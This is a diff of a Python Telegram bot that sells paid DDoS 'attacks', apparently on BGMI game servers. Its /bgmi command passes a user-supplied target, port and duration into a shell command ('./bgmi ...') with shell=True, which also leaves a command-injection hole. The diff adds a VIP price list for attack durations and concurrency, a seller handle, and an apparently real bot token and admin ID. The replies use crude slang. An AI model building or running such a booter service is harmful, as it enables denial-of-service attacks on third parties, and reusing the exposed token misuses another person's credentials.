@@ -10,9 +10,9 @@ from keep_alive import keep_alive
 keep_alive()
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('TOKEM')
+bot = telebot.TeleBot('7230829849:AAFoRZgx_Nyx70PhVGiqgh2UVBniwtIKKHk')
 # Admin user IDs
-admin_id = {"5588464519"}
+admin_id = {"5949303408"}
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -187,12 +187,12 @@ def handle_bgmi(message):
                 port = int(command[2])
                 time = int(command[3])
                 if time > 300:
-                    response = "⚠️𝐄𝐑𝐑𝐎𝐑:170 𝐒𝐄 𝐓𝐇𝐎𝐃𝐀 𝐊𝐀𝐌 𝐓𝐈𝐌𝐄 𝐃𝐀𝐀𝐋 𝐆𝐀𝐍𝐃𝐔."
+                    response = "⚠️𝐄𝐑𝐑𝐎𝐑:281 𝐒𝐄 𝐓𝐇𝐎𝐃𝐀 𝐊𝐀𝐌 𝐓𝐈𝐌𝐄 𝐃𝐀𝐀𝐋 𝐆𝐀𝐍𝐃𝐔."
                 else: 
                     record_command_logs(user_id, '/bgmi', target, port, time)
                     log_command(user_id, target, port, time)
                     start_attack_reply(message, target, port, time)
-                    full_command = f"./bgmi {target} {port} {time} 500"
+                    full_command = f"./bgmi {target} {port} {time} 280"
                     subprocess.run(full_command, shell=True)
                     response = f"𝐂𝐇𝐔𝐃𝐀𝐈 𝐒𝐓𝐀𝐑𝐓𝐄𝐃🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
             except ValueError:
@@ -304,7 +304,7 @@ def welcome_start(message):
     user_name = message.from_user.first_name
     response = f'''𝐐 𝐫𝐞 𝐂𝐇𝐀𝐏𝐑𝐈, {user_name}! 𝐓𝐡𝐢𝐬 𝐢𝐒 𝐘𝐎𝐔𝐑 𝐅𝐀𝐓𝐇𝐑𝐞𝐫𝐒 𝐁𝐨𝐓 𝐒𝐞𝐫𝐯𝐢𝐜𝐞.
 🤖𝐀𝐍𝐏𝐀𝐃 𝐔𝐒𝐄 𝐇𝐄𝐋𝐏 𝐂𝐎𝐌𝐌𝐀𝐍𝐃: /help
-'''
+Purchase from @here_sarcastic '''
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=['rules'])
@@ -324,7 +324,7 @@ def welcome_plan(message):
     response = f'''{user_name}, 𝐏𝐋𝐀𝐍 𝐃𝐄𝐊𝐇𝐄𝐆𝐀 𝐓𝐔 𝐆𝐀𝐑𝐄𝐄𝐁😂:
 
 VIP 🌟:
--> Attack time: 180 seconds
+-> Attack time: 240-280 seconds
 -> After attack limit: 5 minutes
 -> Concurrent attacks: 3
 
@@ -332,7 +332,7 @@ VIP 🌟:
 𝐃𝐚𝐲: 150 𝐫𝐬
 𝐖𝐞𝐞𝐤: 600 𝐫𝐬
 𝐌𝐨𝐧𝐓𝐡: 1100 𝐫𝐬 
-@VenomCHA7
+@here_sarcastic
 '''
     bot.reply_to(message, response)
 
